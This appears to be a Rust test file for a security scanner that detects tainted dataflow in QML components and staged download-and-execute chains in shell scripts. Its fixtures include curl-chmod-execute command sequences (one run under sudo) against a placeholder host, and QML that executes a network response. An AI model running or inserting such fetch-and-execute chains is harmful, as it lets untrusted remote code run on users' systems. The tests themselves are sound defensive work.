//! H4 bounded dataflow and staged shell-chain regressions.

use crate::detect::*;
use omasafe_core::bounds::TimeBudget;

fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
    PayloadEntry {
        relative_path: path.to_owned(),
        kind,
        mode: 0o755,
        size: size as u64,
        sha256_sampled: None,
        sampled_digest: false,
        executable: true,
        coverage_state: CoverageState::Unsupported,
        link_target: None,
        invocation_target: false,
        object_id: None,
    }
}

fn analyze(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
    let mut inventory = PayloadInventory {
        entries: vec![entry(path, kind, source.len())],
        ..Default::default()
    };
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| (entry.relative_path == path).then(|| source.as_bytes().to_vec()),
        &TimeBudget::default(),
    );
    (artifacts, inventory)
}

#[cfg(feature = "qml-parser")]
#[test]
fn one_assignment_network_response_reaches_detached_sink() {
    let source = r#"Item {
    Component.onCompleted: {
        var payload = xhr.responseText;
        Quickshell.execDetached(payload)
    }
}
"#;
    let (artifacts, inventory) = analyze("Main.qml", PayloadKind::Qml, source);
    assert!(artifacts.rendered_findings().iter().any(|finding| {
        finding.rule_id == "oma.qml.detached-execution"
            && finding.evidence == "network-response-executed"
    }));
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
}

#[cfg(feature = "qml-parser")]
#[test]
fn static_assignment_resolves_loader_reference() {
    let source = r#"Item {
    property string panelPath: "./Panel.qml"
    Loader { source: panelPath }
}
"#;
    let mut inventory = PayloadInventory {
        entries: vec![
            entry("Main.qml", PayloadKind::Qml, source.len()),
            entry("Panel.qml", PayloadKind::Qml, 8),
        ],
        ..Default::default()
    };
    let artifacts = analyze_inventory(
        &mut inventory,
        &|entry| match entry.relative_path.as_str() {
            "Main.qml" => Some(source.as_bytes().to_vec()),
            "Panel.qml" => Some(b"Text {}\n".to_vec()),
            _ => None,
        },
        &TimeBudget::default(),
    );
    assert!(
        artifacts
            .edges
            .iter()
            .any(|edge| edge.target_path == "Panel.qml")
    );
    assert!(
        !artifacts
            .rendered_findings()
            .iter()
            .any(|finding| finding.rule_id == "oma.qml.dynamic-reference")
    );
    assert_eq!(
        inventory.entries[0].coverage_state,
        CoverageState::Unreferenced
    );
}

#[cfg(feature = "qml-parser")]
#[test]
fn javascript_assignment_resolves_loader_and_network_input_escalates() {
    let static_source = r#"Item {
    Component.onCompleted: {
        var panelPath = "./Panel.qml";
        Loader { source: panelPath }
    }
}

"#;
    let mut static_inventory = PayloadInventory {
        entries: vec![
            entry("Main.qml", PayloadKind::Qml, static_source.len()),
            entry("Panel.qml", PayloadKind::Qml, 8),
        ],
        ..Default::default()
    };
    let static_artifacts = analyze_inventory(
        &mut static_inventory,
        &|entry| match entry.relative_path.as_str() {
            "Main.qml" => Some(static_source.as_bytes().to_vec()),
            "Panel.qml" => Some(b"Text {}\n".to_vec()),
            _ => None,
        },
        &TimeBudget::default(),
    );
    assert!(
        static_artifacts
            .edges
            .iter()
            .any(|edge| edge.target_path == "Panel.qml")
    );

    let network_source = r#"Item {
    property string panelPath: xhr.responseText
    Loader { source: panelPath }
}
"#;
    let (network_artifacts, _) = analyze("Main.qml", PayloadKind::Qml, network_source);
    assert!(
        network_artifacts.rendered_findings().iter().any(|finding| {
            finding.rule_id == "oma.qml.dynamic-reference"
                && finding.evidence.contains("network-input")
        }),
        "findings: {:?}",
        network_artifacts.rendered_findings()
    );
}

#[cfg(feature = "qml-parser")]
#[test]
fn user_input_reference_is_visible_as_tainted_dynamic_sink() {
    let source = r#"Item {
    Loader { source: userInput }
    FileView { path: clipboard.text }
}
"#;
    let (artifacts, inventory) = analyze("User.qml", PayloadKind::Qml, source);
    let findings = artifacts.rendered_findings();
    assert_eq!(
        findings
            .iter()
            .filter(|finding| finding.rule_id == "oma.qml.dynamic-reference")
            .count(),
        2,
        "user-input reference sinks must not be silently resolved: {findings:?}"
    );
    assert!(
        findings.iter().all(|finding| {
            finding.rule_id != "oma.qml.dynamic-reference"
                || finding.evidence.contains("user-input")
        }),
        "unexpected provenance: {findings:?}"
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Analyzed);
}

#[cfg(feature = "qml-parser")]
#[test]
fn dataflow_exhaustion_is_partial_and_disclosed() {
    let mut source = String::from("Item {\n");
    for index in 0..2100 {
        source.push_str(&format!("    property string p{index}: \"x\"\n"));
    }
    source.push_str("}\n");
    let (artifacts, inventory) = analyze("Huge.qml", PayloadKind::Qml, &source);
    assert!(artifacts.limitations.iter().any(|limitation| {
        limitation.starts_with("dataflow-statement-limit:")
            || limitation.starts_with("dataflow-time-limit:")
    }));
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}

#[cfg(feature = "qml-parser")]
#[test]
fn assignment_depth_exhaustion_is_partial_and_disclosed() {
    let nested = std::iter::repeat_n("\"payload\"", 24)
        .collect::<Vec<_>>()
        .join(" + ");
    let source = format!("Item {{\n    property string p: {nested}\n}}\n");
    let (artifacts, inventory) = analyze("Deep.qml", PayloadKind::Qml, &source);
    assert!(
        artifacts
            .limitations
            .iter()
            .any(|limitation| limitation.starts_with("dataflow-assignment-depth-limit:"))
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}

#[test]
fn staged_fetch_chmod_execute_is_a_lexical_finding() {
    let source = "#!/bin/sh\ncurl https://example.test/payload -o /tmp/oma-payload\nchmod +x /tmp/oma-payload\n/tmp/oma-payload\n";
    let (artifacts, inventory) = analyze("install.sh", PayloadKind::Shell, source);
    assert!(artifacts.rendered_findings().iter().any(|finding| {
        finding.rule_id == "oma.script.download-execute"
            && finding.evidence.starts_with("staged-download-execute:")
    }));
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}

#[test]
fn staged_fetch_chain_tracks_wrapper_execution() {
    let source = "#!/bin/sh\ncurl https://example.test/payload -o /tmp/oma-payload\nchmod +x /tmp/oma-payload\nsudo /tmp/oma-payload\n";
    let (artifacts, _) = analyze("install-wrapper.sh", PayloadKind::Shell, source);
    assert!(artifacts.rendered_findings().iter().any(|finding| {
        finding.rule_id == "oma.script.download-execute"
            && finding.evidence.starts_with("staged-download-execute:")
    }));
}

#[test]
fn staged_fetch_without_chmod_stays_silent() {
    let source =
        "#!/bin/sh\ncurl https://example.test/payload -o /tmp/oma-payload\n/tmp/oma-payload\n";
    let (artifacts, _) = analyze("install.sh", PayloadKind::Shell, source);
    assert!(!artifacts.rendered_findings().iter().any(|finding| {
        finding.rule_id == "oma.script.download-execute"
            && finding.evidence.starts_with("staged-download-execute:")
    }));
}

#[test]
fn staged_chain_ignores_shell_comments_but_keeps_url_fragments() {
    let source = "#!/bin/sh\n# curl https://example.test/#payload -o /tmp/fetched\n# chmod +x /tmp/fetched\n# /tmp/fetched\ncurl https://example.test/#payload -o /tmp/live\nchmod +x /tmp/live # release the downloaded file\n/tmp/live\n";
    let (artifacts, _) = analyze("comments.sh", PayloadKind::Shell, source);
    assert_eq!(
        artifacts
            .rendered_findings()
            .iter()
            .filter(|finding| finding.rule_id == "oma.script.download-execute")
            .count(),
        1
    );
}

#[test]
fn staged_chain_line_bound_is_disclosed() {
    let mut source = String::from("#!/bin/sh\n");
    for _ in 0..1100 {
        source.push_str(":\n");
    }
    let (artifacts, inventory) = analyze("long-chain.sh", PayloadKind::Shell, &source);
    assert!(
        artifacts.limitations.iter().any(|limitation| {
            limitation.starts_with("staged-script-analysis-budget-exhausted:")
        }),
        "limitations: {:?}",
        artifacts.limitations
    );
    assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
}
